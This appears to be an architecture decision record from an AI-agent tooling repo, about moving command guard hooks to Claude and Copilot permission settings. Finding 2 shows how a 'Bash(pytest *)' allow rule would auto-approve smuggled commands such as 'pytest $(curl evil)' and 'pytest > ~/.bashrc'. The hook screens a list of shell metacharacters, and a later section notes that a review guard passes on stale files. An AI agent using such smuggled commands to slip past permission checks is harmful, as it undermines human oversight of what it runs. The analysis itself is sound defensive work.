# ADR-085: cross-harness permission-surface asymmetry (#3217, epic #3197)

Records why migrating the two survivor guard hooks to host-native permissions
is NOT the clean swap #3217 assumed. Status: proposed (owner ratifies).

## Two verified findings (2026-07-20)

1. **Copilot has no repo-committed permission surface; `skill_first_guard`
   self-neuters.** Copilot CLI 1.0.72 ships no permission file a repo can commit.
   `invoke_skill_first_guard.py` main() returns 0 (no-op) when
   `skip_if_consumer_repo("skill-first-guard")` is true (git origin != ai-agents),
   so it enforces ONLY in this repo and ships dead to every consumer. A permission
   rule has no target on Copilot. Fix if kept: remove self-neuter + use `_plugin_root`
   (module lines 32-44) for script discovery instead of `project_path/.claude/...`.

2. **Migrating `test_auto_approval` to Claude `permissions.allow` widens an
   auto-approve path (risk 7/10).** The hook screens 9 metacharacters
   (`;|&<>$` backtick `\n\r`) BEFORE pattern matching. Claude v2.1.x
   `permissions.allow` splits on separators (`&& || ; |` newlines) but NOT command
   substitution `$(...)`/backticks or redirects `<>`. So `Bash(pytest *)` would
   auto-approve `pytest $(curl evil)` and `pytest > ~/.bashrc`. A deny companion
   cannot cleanly close it (global scope, undocumented `$` glob escaping).

## Open owner decisions (deferred, not implemented)
- D-A: is skill_first_guard customer-facing (fix + keep) or internal (relocate to
  .githooks/CI per ADR-084 rule 4, which bans self-neutering hooks on the vendored
  surface)?
- D-B: keep (recommended), migrate, or delete test_auto_approval?
Advisor compression: "protect consumers, or only yourself?"

## Reusable process finding (guard bug worth fixing)
`invoke_adr_review_guard.py` line 78 sets `_AGENTS_DEBATE = ".agents/analysis/"`
and globs `*debate*.md` there, but the adr-review SKILL.md canonically writes debate
logs to `.agents/critique/` (43 files there vs 5 stale in analysis/). The guard
passes only because stale analysis/ files exist, and its check is NOT ADR-specific
(any `*debate*.md` satisfies it). So it does not actually verify THIS ADR was
reviewed. Not fixed in #3274 (out of scope). Candidate follow-up: point the guard
at `.agents/critique/` and match the specific ADR number.

## Landed
PR #3274 (branch docs/3217-adr-085-permission-asymmetry). ADR + debate log +
session log. `mem:` see also .agents/critique/ADR-085-debate-log.md.
